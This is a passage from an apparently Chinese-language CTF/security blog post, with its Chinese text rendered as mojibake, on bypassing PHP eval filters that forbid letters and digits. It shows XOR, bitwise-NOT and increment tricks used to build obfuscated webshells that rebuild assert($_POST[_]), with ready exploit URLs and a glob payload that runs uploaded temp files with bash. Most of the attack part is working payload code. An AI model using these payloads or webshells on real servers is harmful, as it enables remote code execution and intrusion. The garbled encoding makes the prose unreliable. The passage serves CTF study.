class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?shell&#x3D;$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;);$__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___&#x3D;$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>

<p>postä¼ å‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=phpinfo();</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è¿™ä¸ªä»£ç è¡¨è¾¾å¼è®¡ç®—å‡ºå¼‚æˆ–å¯è§çš„ç»“æœ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">128</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&quot;%s^%s&quot;</span>,urlencode(chr($i)),urlencode(chr(<span class="number">255</span>))).<span class="string">&quot;=&gt;&quot;</span>. (chr($i)^chr(<span class="number">255</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200724162439697.png" style="high:80%;width:80%;" />



<h2 id="æ–¹æ³•äºŒï¼ˆå–åï¼‰"><a href="#æ–¹æ³•äºŒï¼ˆå–åï¼‰" class="headerlink" title="æ–¹æ³•äºŒï¼ˆå–åï¼‰"></a><strong>æ–¹æ³•äºŒï¼ˆå–åï¼‰</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ~(<span class="string">&#x27;ç°&#x27;</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line"><span class="comment">//è¾“å‡ºa</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œæœ‰æ•°å­—1ï¼Œè¦å¦å¤–æƒ³åŠæ³•æ„é€ </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"><span class="keyword">echo</span> $_;</span><br><span class="line"><span class="comment">//è¾“å‡º1</span></span><br></pre></td></tr></table></figure>

<p>ä»¥æ­¤ç±»æ¨ï¼Œæ„é€ webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$___=<span class="string">&quot;ç°&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;å’Œ&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;å’Œ&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;çš„&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;åŠ&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;å§‹&quot;</span>;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=<span class="string">&#x27;_&#x27;</span>;$___=<span class="string">&quot;ä¿¯&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;ç°&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;æ¬¡&quot;</span>;$_____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;ç«™&quot;</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br><span class="line"><span class="comment">//assert($_POST[2]);</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?shell=$__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)%2b(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);$_=$__/$__;$____=&#x27;&#x27;;$___=&quot;ç°&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;å’Œ&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;å’Œ&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;çš„&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;åŠ&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;å§‹&quot;;$____.=~($___&#123;$__&#125;);$_____=&#x27;_&#x27;;$___=&quot;ä¿¯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;ç°&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;æ¬¡&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;ç«™&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);</span><br></pre></td></tr></table></figure>

<p>postä¼ å‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>=phpinfo();</span><br></pre></td></tr></table></figure>

<h2 id="æ–¹æ³•ä¸‰ï¼ˆè‡ªå¢ï¼‰"><a href="#æ–¹æ³•ä¸‰ï¼ˆè‡ªå¢ï¼‰" class="headerlink" title="æ–¹æ³•ä¸‰ï¼ˆè‡ªå¢ï¼‰"></a><strong>æ–¹æ³•ä¸‰ï¼ˆè‡ªå¢ï¼‰</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="comment">//è¾“å‡ºArray</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è‡ªå¢æ„é€ å­—ç¬¦</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">$a++;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//è¾“å‡ºb</span></span><br></pre></td></tr></table></figure>

<p>ä»¥æ­¤ç±»æ¨ï¼Œæ„é€ webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line">$_=$_[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?shell=$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;</span><br><span class="line">$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$____.=$__;</span><br><span class="line">$__=$_;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$__%<span class="number">2</span>b%<span class="number">2</span>b;$____.=$__;$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></figure>

<p>postä¼ å‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=phpinfo();</span><br></pre></td></tr></table></figure>

<h1 id="æ— å­—ç¬¦ç»•è¿‡-æé«˜ç¯‡"><a href="#æ— å­—ç¬¦ç»•è¿‡-æé«˜ç¯‡" class="headerlink" title="æ— å­—ç¬¦ç»•è¿‡(æé«˜ç¯‡)"></a><strong>æ— å­—ç¬¦ç»•è¿‡(æé«˜ç¯‡)</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ¯”ä¸Šé¢å¤šäº†ä¸¤ä¸ªé™åˆ¶</p>
<ul>
<li>webshellé•¿åº¦ä¸è¶…è¿‡35ä½</li>
<li>é™¤äº†ä¸åŒ…å«å­—æ¯æ•°å­—ï¼Œè¿˜ä¸èƒ½åŒ…å«<code>$</code>å’Œ<code>_</code></li>
</ul>
<p><strong>php7.2ä¸‹ç®€å•è§£å†³é—®é¢˜</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<p><strong>php5çš„æ€è€ƒ</strong></p>
<p>å¦‚æœæˆ‘ä»¬ç”¨ä¸Šé¢7.2çš„expä¼šæŠ¥é”™ï¼ŒåŸå› å°±æ˜¯php5å¹¶ä¸æ”¯æŒè¿™ç§è¡¨è¾¾æ–¹å¼ã€‚</p>
<p><strong>PHP5+shellæ‰“ç ´ç¦é”¢</strong></p>
<p>è¿™é‡Œåªèƒ½æ˜¯åœ¨linuxçš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚è¿™é‡Œæ²¡æœ‰å¤ç°æˆåŠŸï¼Œç›´æ¥ç”¨Pç¥ç¦»åˆ«æ­Œçš„å›¾äº†ã€‚</p>
<p>â€œåå¼•å·â€æ˜¯PHPä¸­æœ€ç®€å•çš„æ‰§è¡Œshellçš„æ–¹æ³•ã€‚</p>
<p><code>.file</code>èƒ½ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚å¦‚æœæˆ‘ä»¬POSTå‘é€ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯<code>/tmp/phpXXXXXX</code>ï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚</p>
<p>æ­¤æ—¶å°±å¯ä»¥ç”¨åˆ°Linuxä¸‹çš„globé€šé…ç¬¦ï¼š</p>
<ul>
<li><p><code>*</code>å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦</p>
</li>
<li><p><code>?</code>å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦</p>
</li>
<li><p><code>[^x]</code>çš„æ–¹æ³•æ¥æ„é€ â€è¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦xâ€ã€‚</p>
</li>
<li><p><code>[@-[]</code>æ¥è¡¨ç¤ºå¤§å†™å­—æ¯ã€‚</p>
</li>
</ul>
<p>æœ€åï¼Œæˆ‘ä¼ å…¥çš„codeä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[@-[]&#96;;?&gt;</span><br></pre></td></tr></table></figure>

<p>å‘é€æ•°æ®åŒ…å¦‚ä¸‹ï¼š</p>
<img src="https://www.leavesongs.com/media/attachment/2018/10/06/56de7887-0a22-4b06-9ccd-2951a4bdab4c.png" style="high:120%;width:120%;" />

<h1 id="æ— å­—ç¬¦ç»•è¿‡-ä¾‹é¢˜"><a href="#æ— å­—ç¬¦ç»•è¿‡-ä¾‹é¢˜" class="headerlink" title="æ— å­—ç¬¦ç»•è¿‡(ä¾‹é¢˜)"></a><strong>æ— å­—ç¬¦ç»•è¿‡(ä¾‹é¢˜)</strong></h1><h2 id="ä¾‹å­ä¸€ï¼ˆå¼‚æˆ–ï¼‰"><a href="#ä¾‹å­ä¸€ï¼ˆå¼‚æˆ–ï¼‰" class="headerlink" title="ä¾‹å­ä¸€ï¼ˆå¼‚æˆ–ï¼‰"></a><strong>ä¾‹å­ä¸€ï¼ˆå¼‚æˆ–ï¼‰</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]) )&#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçœ‹åˆ°<code>~</code>è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸Šé¢æåˆ°çš„å–åç»•è¿‡å°±ä¸èƒ½ç”¨äº†ã€‚ä½†æ˜¯è¿™é‡Œçš„è¯å¹¶æ²¡æœ‰è¿‡æ»¤<code>$</code>ã€‚æ‰€ä»¥å¯ä»¥ä½¿ç”¨å¼‚æˆ–çš„æ–¹å¼ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br><span class="line"><span class="comment">//è¾“å‡º_GET</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure>

<p>æ„é€ webshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%a0&#125;($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%a1&#125;);&amp;%a0=assert&amp;%a1=eval($_POST[%27cmd%27])</span><br><span class="line">//$&#123;_GET&#125;&#123;%a0&#125;($&#123;_GET&#125;&#123;%a1&#125;);&amp;%a0=<span class="keyword">assert</span>&amp;%a1=eval($_POST[%<span class="number">27</span>cmd%<span class="number">27</span>])</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ç‚¹è¦æ³¨æ„çš„å°±æ˜¯Pç¥åœ¨æé«˜ç¯‡é‡Œé¢è¯´åˆ°çš„ï¼Œå¦‚æœè¿™é“é¢˜ç›®æ˜¯PHPï¼—ç‰ˆæœ¬çš„è¯ï¼Œæ˜¯å¯ä»¥ç”¨å–ååŠ ä¸Šå¼‚æˆ–çš„æ–¹å¼å»åšçš„ï¼Œä½†æ˜¯å¦‚æœæœ¬é¢˜æ˜¯PHP5.6ç‰ˆæœ¬çš„è¯ï¼Œå› ä¸ºä¸æ”¯æŒè¿™ç§è¡¨è¾¾æ–¹å¼å°±åšä¸äº†ã€‚</p>
<h2 id="ä¾‹å­äºŒï¼ˆå–åï¼‰"><a href="#ä¾‹å­äºŒï¼ˆå–åï¼‰" class="headerlink" title="ä¾‹å­äºŒï¼ˆå–åï¼‰"></a><strong>ä¾‹å­äºŒï¼ˆå–åï¼‰</strong></h2><p>[ISITDTU 2019]EasyPHP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosÃ© will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€é¢˜è¿‡æ»¤çš„ä¸œè¥¿æ¯”è¾ƒå¤šï¼ŒæŠŠ<code>$</code>è¿‡æ»¤äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤<code>~</code>ï¼Œå¯ä»¥ç”¨å–åçš„æ–¹å¼ã€‚</p>
<p>ä½†æ˜¯ç¬¬äºŒä¸ªè¿‡æ»¤ï¼Œ<code>strtolower</code>å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼Œç”¨<code>count_chars</code>è¿”å›ç”±æ‰€æœ‰ä½¿ç”¨äº†çš„å­—èŠ‚å€¼ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œå†åˆ¤æ–­å…¶ä¸­æ¯ä¸ªå­—ç¬¦ç´¯è®¡å‡ºç°æ¬¡æ•°æ˜¯å¦å¤§äº 13ã€‚</p>
<p>æŸ¥çœ‹phpinfo</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
